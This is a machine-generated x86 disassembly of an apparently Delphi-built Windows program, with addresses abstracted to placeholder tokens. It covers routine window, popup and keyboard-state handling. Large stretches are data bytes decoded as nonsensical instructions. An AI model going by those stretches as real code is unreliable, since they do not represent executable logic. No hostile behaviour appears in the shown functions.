call sub_4179e4
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417990
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417990
mov eax [ r-xdata ]
call sub_417888
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4294b4
mov [ rw-data ] eax
sub_45d72f
add [ esi ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xffffec ] al
add [ eax ] eax
add eax 0x6f6c6f43
jb r-xdata
stc
inc ebp
add [ eax ] al
add [ eax ] al
or [ eax ] 0x0
add [ eax ] al
add al [ eax ]
or [ ecx + 0x6e ] ecx
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
salc
inc ebp
add [ eax ] cl
add [ eax ] al
dec [ eax ]
add [ eax ] al
jmp [ eax + 0x45f9 ]
outsb
cmp al 0x10
inc eax
add [ eax ] dl
add [ eax ] al
call [ eax + 0x2 ]
inc esi
add [ edx + eax + 0x46 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ 0x676e6152 ] al
add [ gs : eax ] dl
adc [ eax ] al
sbb al [ eax ]
add bh bh
sbb al [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
push es
dec ebp
popad
jb r-xdata
add [ eax ] al
[ 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
cmp al 0x10
inc eax
add [ eax ] dh
add [ eax ] al
inc esp
add [ esi ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax ] al
add al 0x53
imul edi [ edx + 0x65 ] r-xdata
xor al 0x0
add bh bh
or [ edx ] al
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
add eax 0x6c797453
cmp al 0x10
inc eax
add [ eax ] bh
add [ eax ] al
jmp [ eax ]
inc eax
add [ edi ] bl
add [ eax ] al
[ edi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ esi ] al
push ebx
insd
outsd
outsd
je r-xdata
popad
outsb
add [ gs : bx + si ] dl
imul ebp [ esi ] 0x2c004010
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8d656c62
inc eax
add ah al
fadd [ ebp ]
add ecx [ esp + edx * 2 ]
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add ah cl
xor al 0x40
add al bl
pop es
inc edx
add ah dl
xor al 0x40
add [ esi + ecx * 8 + 0x44 ] dl
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
adc al 0x5
inc esi
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add al al
fadd [ ebp ]
or [ edi + 0x73 ] dh
dec esi
outsd
jb r-xdata
add [ ebp + ebp * 4 - 0x773bffbc ] ch
inc esp
add ah bh
jle r-xdata
add al dl
mov dl 0x44
add ah bl
mov [ eax + eax - 0x64 ] al
push cs
add ah dh
std
inc esp
add [ esi + eax * 8 ] bl
inc esp
add [ ecx + ecx * 4 ] cl
inc ecx
add [ eax - 0x3bffbb55 ] dh
jg r-xdata
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
add [ eax ] bl
enter 0x44 0xd0
mov [ eax + eax + 0x78 ] 0xc6
inc esp
add al dh
inc esp
add al al
rol [ eax + eax - 0x1c ] 0x1
add al 0x45
add [ edi + ebp * 8 + 0x44 ] ch
add [ edx + esi * 8 + 0x44 ] bl
add al al
add eax 0x8700046
inc esi
add [ edx + ecx + 0x60046 ] ah
add eax 0x15011400
add [ eax + esi * 4 ] edi
in al dx
inc eax
[ eax - 0x7bffb9f6 ]
add [ eax - 0x76 ] dl
inc esp
add al cl
mov [ eax + eax - 0x24 ] eax
mov [ eax + eax - 0x78 ] es
mov eax [ eax + eax - 0x10 ]
int3
add al cl
in al dx
inc esp
add [ eax - 0x33ffbb0f ] dh
or eax [ esi ]
mov al [ 0x7c004605 ]
mov [ eax + eax + 0x50 ] 0x64004605
les eax [ eax + eax + 0x60 ]
add eax 0xc8140046
inc esp
add [ ebx + esi * 8 - 0xc5bffbc ] al
inc esp
add [ eax + esi * 8 + 0x7d800044 ] bh
inc esp
add [ ebp + edi * 2 - 0x527fffbc ] al
inc esp
les edi [ edi + 0x44 ]
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
inc edx
add [ ebx + ecx + 0xb7c0042 ] al
inc edx
add [ esi + ecx + 0x49c0042 ] ah
inc esi
add [ eax ] cl
stc
inc esp
add [ esi + edi * 8 ] ah
inc esp
add [ eax - 0x3 ] dh
inc esp
add [ eax ] bh
jle r-xdata
jae r-xdata
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
jo r-xdata
rcl [ ecx + ebx * 8 + 0x45 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x45da
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
fiadd [ ebp ]
dec esi
fiadd [ ebp ]
sbb al 0x2
add [ eax ] al
ror [ ebx + 0x44 ] 0x0
test [ esi ] cl
inc edx
sub_45d9ca
inc esp
add [ eax ] dh
scasb [ edi ]
inc esp
add [ eax ] dl
int1
inc esp
add ah cl
int1
inc esp
add al cl
in al dx
inc esp
add [ eax - 0x33ffbb0f ] dh
or eax [ esi ]
mov al [ 0x7c004605 ]
mov [ eax + eax + 0x50 ] 0x64004605
les eax [ eax + eax + 0x60 ]
add eax 0xc8140046
inc esp
add [ eax ] bl
enter 0x44 0xd0
mov [ eax + eax + 0x78 ] 0xc6
inc esp
add al dh
inc esp
add al al
rol [ eax + eax - 0x1c ] 0x1
add al 0x45
add [ edi + ebp * 8 + 0x44 ] ch
add [ edx + esi * 8 + 0x44 ] bl
add al al
add eax 0x8700046
inc esi
add [ edx + ecx + 0x60046 ] ah
add eax 0x15011400
add [ eax + esi * 4 ] edi
in al dx
inc eax
[ eax - 0x7bffb9f6 ]
sub_45df30
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
loopne r-xdata
or al 0x89
add [ eax ] dl
loop r-xdata
stc
inc esp
add [ esi + edi * 8 ] ah
inc esp
add [ eax - 0x3 ] dh
inc esp
add [ eax ] bh
jle r-xdata
inc edx
add [ edi + edx * 2 + 0xccc0046 ] dl
inc esi
add [ eax ] cl
inc esi
add [ eax + 0x12 ] dh
inc esi
add [ ebx + edx + 0x46 ] bh
add ah bl
mov [ eax + eax - 0x64 ] al
xor al 0x12
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x1ffba20 ] cl
loope r-xdata
add al cl
in al dx
inc esp
add [ eax - 0x33ffbb0f ] dh
or eax [ esi ]
fsub [ edx ]
inc esi
add [ edi + eax * 8 + 0x44 ] bh
add [ edi + ebp + 0x32fc0046 ] bl
inc esi
add [ eax + 0x14004631 ] bh
enter 0x44 0x18
add [ ebx + esi * 8 + 0x18d40044 ] al
inc esi
add [ eax + esi * 8 + 0x7d800044 ] bh
inc esp
add [ ebp + edi * 2 + 0x19c80044 ] al
inc esi
add [ ebp + ebp * 4 - 0x773bffbc ] ch
inc esp
add ah bh
jle r-xdata
push cs
inc edx
add ah dh
sbb eax [ esi ]
jl r-xdata
pushfd
add al bh
add al [ eax ]
add [ eax ] cl
fld [ ebp ]
test [ esi ] cl
inc edx
add [ eax + 0xe ] bl
inc esi
add [ eax + edx ] cl
inc esi
add ah dl
xor al 0x40
add [ eax + 0x34 ] bh
inc esi
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
je r-xdata
dec edi
inc esi
add [ eax ] al
inc esi
add ah dl
push eax
inc esi
add [ eax + 0xe00461b ] bh
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x23c0040 ] dl
add [ eax ] al
jo r-xdata
add [ eax ] ah
inc ebp
add [ eax + 0x2 ] dl
add [ eax ] al
movsb [ edi ] [ esi ]
fild [ ebp ]
add al [ fs : eax ]
add [ 0x14000f00 ] bh
add [ edi ] ah
add [ edi ] dh
add [ ecx + 0x200a100 ] al
add [ ecx ] dl
add [ edi ] edx
add [ eax ] esp
add [ edi ] ebx
add [ esi ] eax
add [ eax ] dl
add [ ecx ] dl
add [ edx ] dl
add [ eax ] ebx
add [ edx ] ah
add ch [ eax ]
add [ ecx ] dl
add dl [ ebx ]
and al 0x0
sbb al [ eax ]
inc esi
add [ eax - 0x50 ] al
aas
mov al 0x0
mov al 0x17
mov al 0x3c
mov al 0x1
mov al 0x5
mov al 0xd
mov al 0x10
mov al 0xe
mov al 0x15
mov al 0x19
mov al 0x1d
mov al 0x21
mov al 0x12
mov al 0x29
mov al 0x3d
mov al 0x8
mov al 0x44
mov al 0xb3
push [ edx - 0x13001201 ]
push [ ecx - 0x50004f01 ]
[ esi - 0x52000201 ]
enter 0x44 0x34
xor al 0x46
add [ eax - 0x3a ] bh
inc esp
add al dh
inc esp
add [ eax ] ch
cmp eax [ esi ]
in al 0x4
inc ebp
add [ edi + ebp * 8 + 0x44 ] ch
add [ eax + edx * 2 ] bh
inc esi
add al al
add eax 0x8700046
inc esi
add [ ecx + eax * 2 ] bl
inc esi
add [ eax + 0x11 ] bl
inc esi
add ah dl
adc [ esi ] eax
sbb al 0x54
inc esi
add [ eax + 0x2000460e ] dl
add [ eax ] bl
add [ eax - 0x76 ] dl
inc esp
add [ ebx + ebx + 0x1a880046 ] bh
inc esi
add [ eax + 0x3400448b ] cl
sbb al 0x46
add [ eax ] dh
scasb [ edi ]
inc esp
add [ eax ] dl
int1
inc esp
add ah cl
int1
inc esp
inc ecx
add [ edx + edx ] dh
inc esi
add ah dh
std
inc esp
add ah ah
adc eax 0x890c0046
sub_45e52e
cld
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] al
or eax [ edx + 0x6f ]
jb r-xdata
add [ eax ] al
add [ eax + 0x430b001b ] al
insb
jb r-xdata
popad
outsb
pushad
sbb eax r--data
add bh bh
xchg esp eax
mov [ eax + eax - 0x50 ] es
mov [ eax + eax ] es
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001c ] al
outsd
insb
outsd
jb r-xdata
imul esp [ ebp + 0x6e ] 0x64695774
je r-xdata
inc esi
add [ eax ] cl
sbb [ esi ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax [ eax ]
or eax [ ebx + 0x6c ]
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
hlt
push ebp
jae r-xdata
popad
jb r-xdata
adc [ eax ] al
call 0x2d44e5e6
pop ecx
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax 0x72541000
popad
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x1 ] al
popad
jb r-xdata
and al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] dl
inc eax
add [ eax - 0x4700ffff ] ch
fiadd [ eax + eax + 0x1 ]
fld [ ebp ]
xor [ edx ] eax
add bh bh
xor [ edx ] eax
add bh bh
pop esp
daa
inc esi
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
and [ eax ] al
add eax 0x336c7443
inc esp
add [ eax ] dl
inc eax
add [ edi + 0x70ff0001 ] ah
cmc
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
outsd
insb
outsd
jb r-xdata
add [ eax ] al
sbb al 0xf4
inc esp
outsb
je r-xdata
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
je r-xdata
and [ eax ] eax
push cs
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001f ] al
outsd
outsb
jae r-xdata
outsd
insb
outsd
jb r-xdata
add [ eax ] al
jmp [ eax ]
cmp al [ eax + eax + 0x5d ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
inc esp
cmp eax [ eax + eax - 0x65 ]
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
outsd
outsb
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
pushfd
cmp al 0x44
add [ eax + eax ] dh
dec eax
scasd [ edi ]
inc esp
add [ ecx ] al
add [ eax ] al
imul esi [ edi + ebp * 2 + 0x72 ] r-xdata
test al 0x1
add bh bh
mov eax 0x10044de
jb r-xdata
add [ eax - 0xc ] al
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
jae r-xdata
sbb eax 0x2ec0042
add bh bh
sbb [ ecx + 0x46 ] bl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ds
add [ 0x6e617254 ] dl
add [ eax ] al
and al [ eax ]
push cs
inc esp
popa
jne r-xdata
add eax [ eax ]
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x1cff0001 ] ah
hlt
sub_45f120
mov edi 0x50ffbdff
pop ebx
inc esi
add [ eax + 0x5b ] bh
inc esi
add [ eax ] dl
pop esp
inc esi
add [ eax + 0x5c ] ch
inc esi
add [ ebx * 2 + 0x5d540046 ] bh
inc esi
add ah dl
pop ecx
inc esi
add [ eax + 0x2400465a ] bh
pop ebx
inc esi
add [ edi ] cl
push esp
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
je r-xdata
add [ eax ] al
insd
inc esp
outsd
arpl [ ebx + 0x46 ] bp
outsd
jb r-xdata
add [ eax ] al
add ah dh
int1
inc ebp
add [ eax + eax ] cl
add [ eax ] al
mov al 0x10
inc eax
add al al
xor al 0x40
pop esp
int1
inc ebp
add [ edi ] al
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
add ah cl
xor al 0x40
outsd
insd
inc esp
outsd
arpl [ ebx + 0x46 ] bp
outsd
jb r-xdata
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
inc eax
sbb al 0xf0
inc ebp
add [ edx ] cl
inc ebp
add [ esi ] cl
add [ 0x6d726f46 ] al
jae r-xdata
cmp al 0x10
inc eax
add [ eax - 0x43ffb9d6 ] ch
sub al [ esi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax 0x69500d00
js r-xdata
add [ eax + edx ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 8 + 0x45 ] bh
add [ edx + esi * 8 + 0x45 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
jae r-xdata
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x4c00408d
inc ebp
xor al [ eax ]
or [ ebp + ecx * 2 + 0x6f ] dl
jb r-xdata
xor al [ eax ]
xor [ edx ] 0x40
add [ eax ] cl
push esp
dec ebp
outsd
outsb
arpl [ eax - 0x70 ] bp
hlt
sub_45f3d0
push ebx
push esi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0xffffffec
push esi
call GetWindowLongA
test bl bl
je r-xdata
test ah 0x2
je r-xdata
test ah 0x2
jne r-xdata
and eax 0xfffffdff
or eax 0x200
jmp r-xdata
push eax
push 0xffffffec
push esi
call SetWindowLongA
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetWindowPos
sub_45f41c
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_468b24
mov eax [ rw-data ]
call sub_4209b4
mov eax [ rw-data ]
call sub_42095c
retn
push 0x0
push eax
call ShowOwnedPopups
sub_45f454
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
mov eax 0x8
call sub_4026cc
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
push 0x0
push ebx
call EnableWindow
sub_45f4a4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp - 0x8 ] edx
mov edx [ rw-data ]
mov [ ebp - 0xc ] edx
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
push ebp
push sub_45f547
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_45f510
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push sub_45f454
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f54e
mov eax [ ebp - 0xc ]
mov [ rw-data ] eax
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
retn
sub_45f558
push ebx
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov ebx esi
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
je r-xdata
mov esi [ ebx ]
mov edx 0x8
mov eax ebx
call sub_4026ec
test esi esi
jne r-xdata
push 0xffffffff
mov eax [ ebx + 0x4 ]
push eax
call EnableWindow
sub_45f590
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
je r-xdata
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jmp r-xdata
sub_45f5f4
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
push 0x0
push sub_45f590
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
retn
mov eax [ rw-data ]
retn
sub_45f650
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
or edx 0xffffffff
mov ecx eax
mov ebx [ ecx ]
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax edx
pop ebx
pop ebp
retn 0x8
xor edx edx
mov [ ecx + 0x4 ] 0x1
sub_45f670
add esp 0xfffffff8
call GetActiveWindow
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
mov eax esp
push eax
push sub_45f650
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov al [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_45f69c
push ebx
push esi
push edi
push ebp
mov ebp eax
mov eax [ rw-data ]
call sub_466104
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_466574
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
xor ebx ebx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407e10
test eax eax
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_4660f0
mov ebx eax
test [ ebx + 0x1d ] 0x2
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_466560
mov ebx eax
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407e10
test eax eax
je r-xdata
sub_45f724
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test si 0x4
je r-xdata
test si 0x8
je r-xdata
or bl 0x1
test si 0x1
je r-xdata
or bl 0x4
test si 0x2
je r-xdata
or bl 0x8
test si 0x10
je r-xdata
or bl 0x10
push 0x12
call GetKeyState
test ax ax
jge r-xdata
or bl 0x20
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_45f778
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
or bl 0x1
test esi 0x20000000
je r-xdata
or bl 0x4
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_45f7b4
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test [ esi + 0x10 ] 0x80
je r-xdata
test [ esi + 0x11 ] 0x80
je r-xdata
or bl 0x1
test [ esi + 0x12 ] 0x80
je r-xdata
or bl 0x4
test [ esi + 0x1 ] 0x80
je r-xdata
or bl 0x2
test [ esi + 0x2 ] 0x80
je r-xdata
or bl 0x8
test [ esi + 0x4 ] 0x80
je r-xdata
or bl 0x10
mov eax ebx
pop esi
pop ebx
retn
or bl 0x20
sub_45f800
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45f85e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_45d3b4
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_4041f0
mov eax [ ebp - 0x8 ]
pop edx
call sub_407e10
test eax eax
sete al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f865
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
sub_45f870
push ebx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
pop ebx
retn
sub_45f898
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor edx edx
mov [ ebp - 0xc ] edx
mov esi eax
xor eax eax
push ebp
push sub_45f909
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_45f870
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f910
lea eax [ ebp - 0xc ]
call sub_404008
retn
mov eax [ esi + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7cc
call sub_403a44
sub_45f918
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403260
mov [ edi + 0x4 ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x18 ] al
mov cx 0x50
mov [ edi + 0xa ] cx
movzx eax cx
mov ecx 0xa
xor edx edx
div ecx
mov [ edi + 0x8 ] ax
mov [ edi + 0x1c ] 0x1
mov [ edi + 0x20 ] 0xa
mov [ edi + 0x40 ] 0x4
mov [ edi + 0x3c ] 0xc
mov [ edi + 0x28 ] 0xff000014
mov [ edi + 0x2c ] 0x1
mov [ edi + 0x44 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_45f9a8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41890c
mov edi esi
mov dl [ edi + 0x1c ]
mov eax ebx
call sub_460270
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_460250
mov edx [ edi + 0xc ]
mov eax ebx
call sub_460100
mov ax [ edi + 0x8 ]
mov [ ebx + 0x8 ] ax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45f9f8
push ebx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_45fbb0
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_449168
test al al
jne r-xdata
mov edx [ ebx + 0x10 ]
mov eax ebx
call sub_460100
xor edx edx
mov eax ebx
call sub_460100
jmp r-xdata
sub_45fa30
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebx + 0x5b ] 0x3
je r-xdata
sub al 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x40 ]
add edx [ ebx + 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4292a8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x48 ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_45fa9c
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x2
jb r-xdata
cmp [ ebx + 0x5b ] 0x1
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x44 ]
add edx [ ebx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4292a8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x4c ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_45fb04
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x210 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_460238
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44c00c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x1a ]
add edx eax
mov eax [ ebp - 0x8 ]
call sub_460238
jmp r-xdata
inc ebx
xor esi esi
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_44bfd0
call sub_45fa9c
pop ecx
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_44bfd0
call sub_45fa30
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
inc esi
dec ebx
jne r-xdata
sub_45fbb0
push ebx
push esi
mov ebx eax
mov esi 0x100000
cmp [ ebx + 0x18 ] 0x1
jne r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
mov esi 0x200000
xor eax eax
pop esi
pop ebx
retn
push 0xfffffff0
mov eax [ ebx + 0x4 ]
call sub_44f2dc
push eax
call GetWindowLongA
test eax esi
jne r-xdata
mov al 0x1
